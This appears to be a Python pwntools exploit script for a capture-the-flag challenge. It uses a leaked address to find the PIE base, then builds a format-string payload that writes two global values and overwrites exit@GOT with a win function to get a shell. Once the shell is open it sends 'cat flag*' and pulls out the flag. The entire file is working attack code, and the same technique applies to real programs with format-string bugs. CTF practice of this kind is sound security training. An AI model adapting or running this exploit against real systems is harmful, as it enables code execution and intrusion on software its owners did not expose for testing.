#!/usr/bin/env python3
from pwn import *

# Configuration
host = '5471c5832636455c.chal.ctf.ae'
port = 443

context.log_level = 'info'

def exploit():
    io = remote(host, port, ssl=True)
    
    # Get leak
    io.recvuntil(b'leak for you: ')
    leak = int(io.recvline().strip(), 16)
    log.info(f"Leaked main address: {hex(leak)}")
    
    # Calculate addresses
    pie_base = leak - 0x11c4
    g1_addr = pie_base + 0x405a
    g2_addr = pie_base + 0x405c
    check_win_addr = pie_base + 0x1189
    exit_got_addr = pie_base + 0x4028
    
    log.info(f"PIE base: {hex(pie_base)}")
    log.info(f"check_win: {hex(check_win_addr)}")
    log.info(f"exit@GOT: {hex(exit_got_addr)}")
    
    # Build payload
    # Key insight: Place format specifiers FIRST, then addresses AFTER
    # This avoids null byte issues in the format string
    lower = check_win_addr & 0xFFFF
    offset = 11  # First address will be at argument 11
    
    # Write g1 = 0x161 = 353, g2 = 0x30d = 781
    fmt = f"%353c%{offset}$hn%428c%{offset+1}$hn".encode()
    
    # Write lower 2 bytes of check_win to exit@GOT
    add = (lower - 781) & 0xFFFF
    fmt += f"%{add}c%{offset+2}$hn".encode()
    
    # Pad to 8-byte alignment and add addresses
    pad_len = (8 - (len(fmt) % 8)) % 8
    payload = fmt + b"X" * pad_len
    payload += p64(g1_addr) + p64(g2_addr) + p64(exit_got_addr)
    
    log.info(f"Payload length: {len(payload)} bytes")
    
    # Send payload
    io.sendline(payload)
    
    # Wait for shell to spawn
    sleep(1)
    
    # Get the flag
    io.sendline(b"cat flag*")
    
    # Receive and display output
    try:
        output = io.recvall(timeout=3)
        log.success(f"Output:\n{output.decode(errors='ignore')}")
        
        if b'flag{' in output:
            flag_start = output.index(b'flag{')
            flag_end = output.index(b'}', flag_start) + 1
            flag = output[flag_start:flag_end].decode()
            log.success(f"FLAG: {flag}")
            return flag
    except Exception as e:
        log.error(f"Error: {e}")
        io.interactive()
    
    io.close()
    return None

if __name__ == '__main__':
    flag = exploit()
    if flag:
        print(f"\n{'='*60}")
        print(f"FLAG CAPTURED: {flag}")
        print(f"{'='*60}\n")
